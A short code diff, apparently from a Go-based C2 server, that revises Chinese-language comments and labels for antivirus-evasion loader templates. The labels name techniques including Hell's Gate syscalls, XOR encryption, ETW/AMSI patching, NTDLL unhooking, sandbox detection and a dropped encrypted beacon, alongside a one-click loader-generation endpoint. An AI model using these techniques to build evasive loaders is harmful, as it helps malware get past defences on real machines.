@@ -5,7 +5,7 @@ package server
 // 免杀 Windows EXE。模板移植自 E:\AI\result 六技术组合中的两套：
 //   technique1（经典）：VA+CreateThread + Hell's Gate + DoubleXOR + IPv4
 //     + ETW/AMSI Patch + NTDLL 脱钩 + 沙箱检测
-//   technique3（强免杀）：+ VEH 保护 + 睡眠混淆 + 深度沙箱 5 重检测 + 行为延迟
+//   technique3（强免杀）：VEH 反调试 + 深度沙箱 5 重检测 + 行为延迟 + 内存清洗（落盘执行型）
 // 仅用于授权渗透测试。
 
 import (
@@ -35,7 +35,7 @@ var evasionTechniques = map[string]struct{ Path, Label, PayloadFormat string }{
 	// 加载 Go PE 不可靠（Go runtime 在 donut 加载器内无法启动），此型最稳。
 	"t0_drop":    {"evasion/templates/technique0/loader.go", "稳定：内嵌加密 beacon→解密落临时目录随机名→执行（回连最可靠）", "amd64_exe"},
 	"t1_classic": {"evasion/templates/technique1/loader.go", "经典：HellsGate+DoubleXOR+IPv4+ETW/AMSI补丁+NTDLL脱钩", "shellcode"},
-	"t3_sleep":   {"evasion/templates/technique3/loader.go", "强免杀：+VEH保护+睡眠混淆+深度沙箱检测+行为延迟", "amd64_exe"},
+	"t3_sleep":   {"evasion/templates/technique3/loader.go", "强免杀：VEH反调试+深度沙箱5重检测+行为延迟+内存清洗（落盘执行型）", "amd64_exe"},
 }
 
 // POST /api/tools/c2/loader-generate — 免杀加载器一键生成。
